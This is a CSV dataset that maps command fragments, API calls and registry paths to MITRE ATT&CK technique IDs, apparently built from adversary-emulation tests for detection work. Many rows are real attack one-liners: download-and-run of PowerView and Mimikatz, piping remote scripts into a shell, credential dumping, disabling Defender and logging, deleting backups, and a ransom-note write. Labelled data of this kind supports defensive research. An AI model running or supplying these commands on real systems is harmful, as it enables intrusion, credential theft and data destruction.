command,mitre_id
su-bruteforce,T1110
pcalua.exe -a $process,T1202
(%COMMON_ STARTUP%\\eoffice.exe),T1547
"cmd.exe /c ""$env:temp\psexec.exe -accepteula \\$targethost cmd.exe /c echo ""--access-token""""",T1569
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose,T1558
"Write-Host ""Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\t1003.001-13-rdrleakdiag directory.""",T1003
PubPrn.vbs,T1216
/sbin/auditd,T1562
vaultcmd.exe,T1555
PerfLogs,T1485
"Import-Module ""PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1""",T1135
"echo ""Keep in mind that the faster you will get in touch, the less damage we cause"" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
"appDir=""$(dirname $(dirname ""$currentDir""))""",T1083
TerminateProcess(),T1106
Invoke-DCOM,T1021
Set-Acl -Path $termsrvDll -AclObject $ACL,T1505
VirtualAllocEx,T1055
systemsetup,T1082
CreateProcess(),T1106
Create Subkey,T1574
cmd.exe /c %APPDATA%\notepad.exe /B,T1036
ZoomVideoApp.exe,T1036
C:\ProgramData\Initech\Initech.exe /run,T1547
icacls . /grant Everyone:F /T /C /Q,T1222
"$HOME/.../sh -c ""echo $test_message""",T1036
ekrn.exe,T1480
.\calc.exe.lnk,T1204
/tmp/1,T1074
GlobalMemoryStatusEx,T1680
"$PYTHON_EXE -c ""print('Triggering Hook via usercustomize.py...')""",T1546
$env:COR_PROFILER = '$clsid_guid',T1574
"Write-Host 5.A modified KeyScramblerIE.dll can be copied to temp, which can be misused by Attacker",T1574
diantz /f {PATH:.ddf},T1036
‘autocheck autoche *’,T1112
icacls C:\Windows\System32\Narrator.exe /grant Administrators:F /t,T1546
"$DirectorySearcher.PropertiesToLoad.Add(""Name"")",T1018
"odbcconf.exe /S /A {REGSVR ""$dll_payload""}",T1218
"Invoke-WebRequest $domain -UserAgent ""Wget/1.9+cvs-stable (Red Hat modified)"" | out-null",T1071
WINVNC.exe,T1036
"rundll32.exe {DLLname, DLLfunction}",T1218
rwdsk,T1070
"set windir=c:\test& cd ""C:\Program Files\Internet Explorer\"" & iediagcmd.exe /out:{PATH_ABSOLUTE:.cab}",T1218
"Write-Host ""[Error] Invalid Inputs""",T1046
Invoke-ATHHTMLApplication -HTAFilePath $hta_file_path -ScriptEngine $script_engine -SimulateUserDoubleClick,T1218
%USERPROFILE%\Adobe\Driver\dwg\,T1036
"Add-DnsClientNrptRule -Namespace ""endpoint.security.microsoft.com"" -NameServers 127.0.0.1 -Comment ""Silenced by Name Resolution Policy Table""",T1562
squirrel.exe --updateRollback={REMOTEURL},T1218
cat $Out_Filepath,T1555
"Query=""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325""};",T1546
PrintBrm -b -d {PATH_SMB:folder} -f {PATH_ABSOLUTE:.zip},T1105
c8:27:cc:c2:37:5a,T1497
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowInfoTip /t REG_DWORD /d 0 /f,T1112
NSXPCConnection API,T1559
"REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$target_binary"" /v GlobalFlag /t REG_DWORD /d 512",T1546
gcloud compute os-login ssh-keys add,T1098
$STANDARD_INFORMATION,T1070
bcdedit,T1490
net group domain admins /domain,T1069
"reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\BackupPath"" /t REG_EXPAND_SZ /d ""%systemroot%\system32\notepad.exe"" /f",T1112
%temp%\T1036.007_masquerading.ps1.exe,T1036
Start-Sleep -s 3,T1548
Rt1AdjustPrivilege,T1106
Start-Process $UltraVNC_Viewer_Path,T1219
"az storage file download --account-name ""$storage_account_name"" --share-name ""$file_share_name"" -p ""$file_path"" --only-show-errors --dest $tmpFunctionCode",T1528
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v StartMenuLogOff /t REG_DWORD /d 1 /f",T1112
IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force,T1555
$DomainUsers | Foreach-Object {,T1110
HKEY_CURRENT_USER\Console\WindowsUpdate,T1112
"powershell.exe ""IEX (New-Object Net.WebClient).DownloadString('$mimurl'); Invoke-Mimikatz -DumpCreds""",T1059
echo 'load_rc_config ${name}' >> $rc_service_path/$rc_service_file,T1543
Set-PSReadLineOption -HistorySavePath {File Path},T1562
Security Settings\Advanced Audit Policy Configuration,T1562
HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls,T1218
MachineGUID,T1480
Set-Clipboard -Value '$command',T1202
GetUserDefaultUILanguage,T1614
OpenSCManagerW(),T1007
foreach($prop in $props),T1552
New-Item -Path $ChannelPath -Force,T1562
C:\Program Files (x86)\Foxit Software\Foxit Reader\FoxitRdr64.exe,T1036
podman run,T1543
$wc.Dispose(),T1491
chmod 4777 [file],T1548
vim-cmd vmsvc/getallvms,T1564
osacompile -x -o xcode.app main.applescript,T1059
net localgroup administrators art-test /add,T1078
ProgramArguments,T1543
"""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" \\$target -accepteula -s ""cmd.exe""",T1053
if ($test.Connected) {,T1016
"echo ""*** Log Group Deleted ***""",T1562
"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""list all"" ""delete 1"" ""quit"" ""quit""",T1003
"$sheet.Cells.Item(14,1) = ""=FWRITELN(A5, `""oStream.Type = 1`"")""",T1204
"return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);",T1562
net.exe group /domain,T1069
Windows.Data.TimeZones.zh-PH.pri,T1036
"Get-Item -Path ""HKCU:Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run""",T1012
chflags hidden /var/tmp/T1564.001_mac.txt,T1564
else,T1048
Get-Keystrokes,T1056
otherchecks -noninteractive -consoleoutput,T1082
”C:\Windows\system32\schtasks.exe” /Create /F /SC DAILY /ST 12:00 /TN MicrosoftEdge /TR “c:\Windows\system32\wscript.exe C:\Windows\temp\Windows.vbe”,T1053
Dim runTime As String,T1137
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\GameCon,T1027
$User.Save(),T1136
kk_KZ,T1614
FileRecvWriteRand,T1027
"reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test"" /v StartEXE /t REG_SZ /d C:\WINDOWS\system32\cmd.exe /f",T1546
show processes,T1057
%APPDATA%/Google/Chrome,T1217
Scan-Dir $_,T1083
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\QQMusic,T1547
"echo ""ExecStop=$execstop_action"" >> $systemd_service_path/$systemd_service_file",T1543
IEX (New-Object Net.WebClient).DownloadString('$remote_script'); Invoke-Mimikatz -DumpCreds,T1003
chattr -i $file_to_modify,T1222
"Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\NPPSPY.dll"" -Destination ""C:\Windows\System32""",T1003
SOFTWARE\Microsoft\.NETFramework\policy\v2.0,T1012
openssl genrsa -out $key_filename 4096,T1553
Get-AntiPhishRule,T1562
Start-Sleep -Second 4,T1083
"[ ""$(uname)"" = 'FreeBSD' ] && alias python3=python3.9 && printf '#\!/usr/local/bin/bash' | sudo tee /etc/rc.local || printf '#!/bin/bash' | sudo tee /etc/rc.local",T1037
mshta.exe {PATH:.hta},T1218
"New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value ""$dll_path""",T1547
mkdir $output_folder,T1003
Dim taskName As String,T1137
Start-Sleep -Seconds 7,T1027
CoCreateGuid,T1106
chrome_elf.dll,T1036
sudo touch /tmp/password-auth.bk,T1056
LR02DPt22R,T1027
GetRegValue,T1012
/sbin/emond,T1546
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideClock /t REG_DWORD /d 1 /f",T1112
[System.Environment]::UserName | Out-File -FilePath .\CurrentactiveUser.txt,T1033
defaults,T1037
"echo ""dn: CN=Admin User,CN=Users,DC=$domain,DC=$top_level_domain\nchangetype: add\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: user\ncn: Admin User\nsn: User\ngivenName: Atomic User\nuserPrincipalName: adminuser@$domain.$top_level_domain\nsAMAccountName: adminuser\nuserAccountControl: 512\nuserPassword: {CLEARTEXT}s3CureP4ssword123!\nmemberOf: CN=Domain Admins,CN=Users,DC=$domain,DC=$top_level_domain"" > tempadmin.ldif",T1136
HKEY_CURRENT_User\Environment\windir,T1574
w3esvc,T1543
.config/solana/id.json,T1555
OneDrive.exe,T1036
echo ' ${command} /tmp/art-test.marker' >> $rc_service_path/$rc_service_file,T1543
MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe},T1105
"""$psexec_path"" /accepteula \\$machine -c $mimikatz_path ""lsadump::lsa /inject /id:500"" ""exit""",T1055
"rundll32.exe pcwutl.dll,LaunchApplication {PATH:.exe}",T1218
C:\Windows\System32\inetsrv\appcmd.exe list apppool /@t:*,T1003
catch {,T1098
esentutl.exe /y {PATH_SMB:.source.exe} /d {PATH_SMB:.dest.exe} /o,T1564
_objc_getClass(),T1129
reg query HKCU /f password /t REG_SZ /s,T1552
CScript.exe AtomicTestT1105.js //E:JScript,T1105
shutdown /r /t 1,T1529
.doc,T1005
launchctl start,T1569
systemctl stop ufw,T1562
Clear-DnsClientCache,T1562
Software\Microsoft\Windows\CurrentVersion\Run,T1547
termsrv.dll,T1505
Connect-AzureAD -Credential $Credential > $null,T1098
getfattr --only-values,T1564
"if (Test-Path -Path ""$env:SystemRoot\System32\rdrleakdiag.exe"") {",T1003
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce,T1012
ntsd.exe -g {CMD},T1127
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce,T1012
Snaffler -noninteractive -consoleoutput,T1552
SQLToolsPS.exe -noprofile -command Start-Process {PATH:.exe},T1218
Get-ChildItem -Hidden C:\Users\$usernameinfo\AppData\Local\Microsoft\Credentials\,T1552
tree /F >> $output_file,T1083
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=computer) $optional_args",T1018
"[System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $destPath, $false)",T1562
aws --no-sign-request s3 cp --recursive s3://$s3_bucket_name /tmp/$s3_bucket_name,T1530
Get-Service WinDefend #check the service state of Windows Defender,T1518
"mkdir -p ""$TEMPDIR""",T1546
SetContextThread,T1055
"echo ""* * * * * $command"" > $tmp_cron && crontab $tmp_cron",T1053
echo 'rcvar=art_test_enable' >> $rc_service_path/$rc_service_file,T1543
sitecustomize.py,T1546
"cp ~/Library/""Application Support/Google/Chrome/Default/Login Data"" ""/tmp/T1555.003_Login Data""",T1555
msrun.bat,T1059
"Write-Host "" [!] $username:${password} are valid credentials!`r`n""",T1110
"Start-Process ""WinWord""",T1137
Credential = $cred,T1114
avp.exe,T1057
time(),T1124
"netsh.exe add helper ""$helper_file""",T1546
com.apple.openssl.plist,T1036
doFilter,T1040
csi.exe {PATH:.cs},T1127
net group /domain,T1069
PermitRootLogin,T1098
"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableRealtimeMonitoring"" -Value 1",T1562
echo 0> $log_path,T1070
attrib.exe +h $file_or_folder\T1222.001_attrib2.txt,T1222
ifconfig.me,T1016
PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON,T1562
FuncName,T1553
show users,T1033
"Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\ticket.kirbi""",T1550
c:\Windows\System32\wbadmin.exe delete catalog -quiet,T1490
"reg add ""hklm\system\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",T1078
dscacheutil -q user,T1087
fltMC.exe unload SysmonDrv,T1562
wlanAPI.dll,T1016
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > $output_file,T1083
sc.exe,T1569
GetSystemInfo,T1082
HH.exe {PATH_ABSOLUTE:.exe},T1218
rsync,T1105
cmd /c tasklist,T1057
"wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u ""$payload_path""",T1218
"code.exe tunnel --accept-server-license-terms --name ""tunnel-name""",T1219
"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\AtomicRedTeam"" /v ""Driver"" /d ""AtomicTest.dll"" /t REG_SZ /f",T1547
"Write-Host ""STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON"" -fore green",T1003
Expected: $ExpectedOutput,T1218
curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > $output_file,T1074
"} elseif ($row.ContainerName -ne """" -and $row.BlobName -eq """") {",T1530
InvocationMethod = '$invocation_method',T1218
"echo ""Type=simple"" >> $path_to_systemd_service",T1053
setenforce 0,T1562
netstat -ano | findstr EST,T1049
ufw prepend deny from 1.2.3.4,T1562
"Start-Process ""$PathToAtomicsFolder\T1055\bin\x64\redVanity.exe"" $pid",T1055
"reg query ""HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation"" /v TimeZoneKeyName",T1124
sudo unlink $system_log_path,T1070
"reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f",T1546
"reg add ""HKEY_CURRENT_USER\Software\Classes\.pwn\Shell\Open\command"" /ve /d ""C:\Windows\System32\calc.exe"" /f",T1548
DLLRegisterServer,T1218
./stratus warmup aws.defense-evasion.vpc-remove-flow-logs,T1562
foreach ($cmdlets in $malcmdlets) {,T1059
"Get-Item -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\RunServices""",T1012
Index,T1053
"echo ""Type=simple""",T1543
"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\$new_key"" /t REG_SZ /v Command /d $new_executable /f",T1112
New-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\Filesystems\NTFS -Name SymlinkRemoteToLocalEvaluation -PropertyType DWORD -Value 1 -Force -ErrorAction Ignore,T1222
chcp,T1614
set | grep LANG,T1614
"Write-Host ""Extracting archive to $extractFolder (overwriting existing files)"" -ForegroundColor Cyan",T1562
aws iam create-group --group-name $username,T1098
Select-Object -First 1 -ExpandProperty Name,T1562
if (MatchesExtension $_) {,T1083
"$PathToAtomicsFolder\T1055.012\bin\x64\CreateProcess.exe -program ""$hollow_binary_path"" -debug",T1055
systemctl enable $systemd_timer_name,T1053
taskkill,T1489
"net groups ""Exchange Organization Management"" /domain",T1069
"$ADSearch.Filter=""(l=$keyObjectGuid)""",T1552
net.exe users,T1087
find $search_path -name id_rsa 2>/dev/null -exec cp --parents {} $output_folder \;,T1552
cat $HISTFILE,T1562
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FIDO"" /v ""AllowExternalDeviceSignon"" /t REG_DWORD /d 0 /f",T1112
Get-MailboxExportRequest,T1114
Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log},T1127
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose,T1018
"echo ""[Install]"" >> $path_to_systemd_timer",T1053
"command, as well as",T1057
"Get-Item -Path ""HKLM:Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell""",T1012
LogoutHook,T1037
"Write-Host ""Service Principal $($sp.DisplayName) was added to $($role.DisplayName)""",T1098
cmd /c systeminfo,T1082
start fodhelper.exe,T1548
"reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f",T1546
api_dev_key = $apiKey,T1567
HTTP GET,T1071
go run main.go GoAWSConsoleSpray -a $aws_account_id -u PathToAtomicsFolder/T1110.003/src/aws_users.txt -p PathToAtomicsFolder/T1110.003/src/aws_passwords.txt,T1110
sudo,T1548
"$which_python -c 'import requests;import os;url = ""$script_url"";malicious_command = ""$executor $payload_file_name $script_args"";session = requests.session();source = session.get(url).content;fd = open(""$payload_file_name"", ""wb+"");fd.write(source);fd.close();os.system(malicious_command)'",T1059
"else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq ""7"" ];",T1562
"wmic /node:""$node"" service where (caption like ""%$service_search_string%"")",T1047
foreach($table in $tables) {,T1619
takeown.exe /F filepath,T1222
%temp%\SMB\,T1074
"echo ""python3 -c \""import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK')) \"" "" >> /etc/init.d/T1543.002",T1543
SystemParametersInfoAPI,T1106
at.allow,T1053
grep -ri password $file_path,T1552
"echo ""\$ART=$ART""",T1059
"Write-Output ""Enumeration complete. Results written to: $out""",T1083
"if [ -x ""$(command -v dscl)"" ]; then dscl . -list /Groups; else echo ""dscl is missing from the machine. skipping...""; fi;",T1069
EnumSystemLanguageGroupsA,T1106
"Start-Process ""$script_path""",T1059
"Write-Host ""[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'""",T1046
NetServerEnum,T1018
"reg export ""HKEY_CURRENT_USER\Control Panel\Desktop"" %userprofile%\backup.reg",T1546
"New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile"" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force",T1562
"cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost ""script:$remote_payload""",T1216
"cd ""$PathToAtomicsFolder/T1098.001/bin/""",T1098
ps aux >> $output_file,T1057
"sc create evilservice binPath=""\""c:\\ADS\\file.txt:cmd.exe\"" /c echo works > \""c:\ADS\works.txt\"""" DisplayName= ""evilservice"" start= auto\ & sc start evilservice",T1564
regsvr32.exe,T1218
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated,T1012
regsvr32.exe /s {PATH:.dll},T1218
dscl,T1564
"mavinject $mypid /INJECTRUNNING ""$dll_payload""",T1055
poweroff -r 3,T1529
KERNEL32,T1106
"open -a ""/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"" --args --remote-debugging-port=1337 --remote-allow-origins=http://localhost/",T1539
"Write-Host "" [!] ${user}:${password} are valid credentials!""",T1110
.config,T1574
unset HISTFILE,T1070
mmc C:\Users\foo\admintools.msc /a,T1218
"echo ""$at_command"" | at $time_spec",T1053
HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0 ProcessorNameString,T1012
sfinda,T1083
query.exe user,T1218
"Set-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Shell"" -Value ""$newvalue""",T1547
"copy ""$executable_binary"" ""\\?\C:\Windows \System32\mmc.exe""",T1548
key,T1140
DonutTest,T1055
net config workstation,T1016
CryptEncrypt,T1486
cat /etc/shells,T1059
RegOpenKeyW,T1106
libcurl,T1129
odbcconf /a {REGSVR {PATH_ABSOLUTE:.dll}},T1218
/var/cron/tabs/,T1053
VSLaunchBrowser.exe .exe {REMOTEURL:.exe},T1105
@rpath,T1574
"reg add ""HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls"" /v ""AtomicTest"" /t REG_EXPAND_SZ /d ""C:\Users\Public\AtomicTest.dll"" /f",T1546
"if [ -f /sys/class/dmi/id/chassis_vendor ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i ""Xen\|Bochs\|QEMU""; fi",T1082
chmod g+s,T1548
Bka.exe,T1057
%TEMP%/TS_FB56.tmp,T1074
chmod -R $numeric_mode $file_or_folder,T1222
windows\system32\,T1053
"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v NetWire /t REG_SZ /d ""C:\Users\admin\AppData\Roaming\Install\Host.exe"" /f",T1112
reg add,T1112
Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler $infotech_storage_handler -TopicExtension $topic_extension -HHFilePath $hh_file_path -CHMFilePath $chm_file_path,T1218
"rundll32.exe file.dll,#1",T1218
"dir ""c:\Documents and Settings"" >> %temp%\download",T1083
Invoke-PowerDump,T1003
vpcext,T1497
$file.attributes='System',T1564
mips_ff,T1562
echo '#' >> $rc_service_path/$rc_service_file,T1543
%temp%\T1036.007_masquerading.pdf.exe,T1036
7z a -p $file_password -mhe=on $encrypted_file_name $input_file_path,T1486
cipher.exe /w:C:,T1485
"echo ""Description=Executes Atomic Red Team Systemd Timer Service"" >> $path_to_systemd_timer",T1053
"$sheet.Cells.Item(16,1) = ""=FWRITELN(A5, `""oStream.SaveToFile `""`""C:\Users\`""&A1&`""\AppData\Local\Temp\`""&A2&`""`""`"", 2`"")""",T1204
.JPEG,T1036
"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender"" /v ""DisableAntiSpyware"" /t REG_DWORD /d ""1"" /f >NUL 2>nul",T1562
/proc/[pid],T1055
touch,T1070
"xattr -lr * / 2>&1 /dev/null | grep -C 2 ""00 00 00 00 00 00 00 00 40 00 FF FF FF FF 00 00""",T1564
gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user},T1134
"awk 'BEGIN {system(""/bin/sh &"")}'",T1059
NtQueueApcThread,T1055
pond~!@6”{Unique Identifier},T1136
DsRoleGetPrimaryDomainInformation,T1082
"Write-Host -ForegroundColor green ""Finished""",T1110
"rundll32.exe shell32.dll,Control_RunDLL {PATH_ABSOLUTE:.dll}",T1218
env_auth = true,T1567
"PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe -w ""%temp%\nanodump.dmp""",T1003
Remove-Item $profile\logins.json > $null,T1555
wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash,T1059
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon,T1547
"sudo find /var/log -name ""$system_log_name3*"" -exec unlink {} \; #using ""unlink"" execution",T1070
diskshadow.exe,T1490
PathToAtomicsFolder\..\ExternalPayloads\LanguageKeyboardLayout.exe,T1614
"reg add ""HKEY_CLASSES_ROOT\Directory\Background\shell\Size Modify\command"" /ve /t REG_SZ /d ""C:\Windows\System32\calc.exe"" /f",T1547
cdb.exe -cf {PATH:.wds} -o notepad.exe,T1127
rc.exe,T1574
"Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\ExcelVBAaddin.xlam"" ""$env:APPDATA\Microsoft\Excel\XLSTART\notepad.xlam""",T1137
schtasks /query /S $target.$domain,T1558
execve,T1574
Microsoft.IdentityServer.ServiceHost.exe,T1057
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainPolicy -verbose,T1201
eventvwr.msc,T1548
"mshta vbscript:Close(Execute(""GetObject(""""script:https[:]//webserver/payload[.]sct"""")""))",T1218
whoami/upn&whoami/fqdn&whoami/logonid&whoami/all,T1033
PowerShellInfo.exe,T1036
copy $exe_to_launch not_an_scr.scr,T1218
if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi;,T1056
"Compress-Archive -Path $foundFilePaths -DestinationPath ""$outputZip\data.zip""",T1005
Microsoft.IdentityServer.Servicehost,T1556
"reg add ""HKCU\Software\Microsoft\Terminal Server Client"" /v AuthenticationLevelOverride /t REG_DWORD /d 0 /f",T1112
"netsh advfirewall firewall add rule name=""atomic testing"" action=allow dir=in protocol=TCP localport=450",T1562
HKLM\Software\NFC\IPA,T1012
ESTCommon.dll,T1036
"Mount-DiskImage -ImagePath ""$path_of_iso""",T1553
cat $input_folder/$input_file.enc | base64,T1560
VNC,T1219
.git,T1564
Invoke-TokenManipulation,T1134
swapon -a,T1562
"Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize",T1518
password=$(openssl passwd -1 art),T1078
HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{SIP_GUID},T1553
"cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com",T1216
"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"" /v ""DisableConfig"" /t ""REG_DWORD"" /d ""1"" /f",T1490
"""$lazagne_path"" browsers",T1555
API:{uuid},T1558
DeviceSync,T1112
C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe,T1218
"Invoke-WebRequest -OutFile C:\Users\$env:username\Downloads\GoToAssist.exe ""https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_RcbdoaEp8IA-Qn8wpbKlpGIflS-39gW6RuWRM-XHwtkRVMLBsp5RSKp-a3PBM-Pb1Fliy73EDgoaxr-q83WtXbLKqD7-u3cfDl9gKsymmhdkTGsXcDXir90NqKj92LsN_KpyYwV06lIxsdRekhNZjNwhkWrBa_hG8RQJqWSGk6tkZLVMuMufmn37eC2Cqqiwq5bCGnH5dYiSUUsklSedRLjh4N46qPYT1bAU0qD25ZPr-Kvf4Kzu9bT02q3Yntj02ZA99TxL2-SKzgryizoopBPg4Ilfo5t78UxKTYeEwo4etQECfkCRvenkTRlIHmowdbd88zz7NiccXnbHJZehgs6_-JSVjQIdPTXZbF9T5z44mi4BQYMtZAS3DE86F0C3D4Tcd7fa5F6Ve8rQWt7pvqFCYyiJAailslxOw0LsGyFokoy65tMF980ReP8zhVcTKYP8s8mhGXihUQJQPNk20Sw&downloadTrigger=restart&renameFile=1""",T1219
certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll},T1218
ExecStartPre,T1543
HKEY_CURRENT_USER\Software\Bitcoin\Bitcoin-Qt,T1012
cmd.exe /c del,T1070
Hide500Users,T1564
"if [ ""$(system_profiler SPHardwareDataType | grep ""Model Identifier"" | grep -v 'Mac')"" != """" ]; then echo 'Virtualization Environment detected'; fi;",T1497
RegEnumKeyW,T1106
cat /etc/shadow,T1003
findstr,T1083
if (Test-Path $destPath) { Remove-Item -Path $destPath -Force -ErrorAction SilentlyContinue },T1562
teams.exe,T1218
$PasswordProfile.Password = $password,T1136
Restart-Computer,T1547
"reg add ""HKLM\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational"" /v Enabled /t REG_DWORD /d 0 /f",T1562
make /tmp/cap,T1548
forfiles /p c:\windows\system32 /m notepad.exe /c $process,T1202
NtResumeThread,T1106
"netsh advfirewall firewall set rule group=""file and printer sharing"" new enable=Yes",T1562
nodeName,T1543
dir \\$domain\SYSVOL,T1558
IpOperation,T1106
